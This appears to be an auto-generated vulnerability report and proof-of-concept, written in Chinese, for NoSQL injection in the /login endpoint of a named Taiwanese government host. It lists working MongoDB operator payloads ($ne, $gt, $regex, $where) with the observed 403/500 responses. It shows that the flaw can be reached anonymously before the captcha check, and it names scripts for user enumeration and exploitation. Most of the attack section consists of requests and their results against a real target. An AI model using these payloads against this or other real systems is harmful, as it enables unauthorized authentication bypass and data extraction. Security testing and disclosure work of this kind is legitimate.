# POC/EXP — /login 接口存在 NoSQL 注入（username/password 字段可注入 Mongo 操作符）

> 漏洞ID: `1c786408-3db0-486b-995d-0a07e662d331`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4004/login (username, password 字段)`

**類型**: NoSQL 注入

## 描述

POST /login 的 username 与 password 字段直接拼入 MongoDB 查询（User.find({username, password})），未做类型/操作符过滤。不同 NoSQL 操作符产生可区分的确定性响应：username 用 $ne/$gt（广匹配多用户）→ HTTP 403 {"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}；用 $eq/$in/$regex(精确)/$where/$exists/$not/纯字符串（0或1用户匹配）→ HTTP 500 body 为 "TypeError"（11字节）。该差分证明操作符确实到达数据库查询层，且 password 校验可被 NoSQL 对象绕过。captcha.enable:true 但 user 查询发生在 captcha 校验之前（无 captcha 字段也返回相同 403），故 NoSQL 路径无需有效 captcha 即可触发。

## 前置條件

无需登录、无需有效 captcha（captcha 校验在 user 查询之后）；可匿名 POST。

## POC / 復現步驟

```
请求1:
POST /login HTTP/1.1
Content-Type: application/json
body: {"username":{"$ne":null},"password":{"$ne":null},"captcha":"1","domain":"AUTH_SERVER"}
响应: HTTP 403, content-length 75
{"name":"ErrorWithStatusCode","message":"無法登入的來源","code":403}

请求2:
POST /login
body: {"username":{"$eq":"admin"},"password":"x","captcha":"1","domain":"AUTH_SERVER"}
响应: HTTP 500, content-length 11
"TypeError"

请求3 (username $gt 任意下界 '!'~'{' 全部): -> 403 相同
请求4 (username $regex:"^a"~"^z"/数字 单前缀 全部): -> 500 "TypeError"
请求5 (username $in:["admin"] 或 $where:"true" 或 $not): -> 500 "TypeError"
请求6 (no-captcha-field): -> 403 相同 (证明 captcha 不 gate 该路径)

完整行为矩阵(11种)与40字符首字母枚举、$gt 范围14值、21常见用户名均通过 python3 nosql_probe.py / nosql_extract.py / nosql_exploit.py 复现。
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
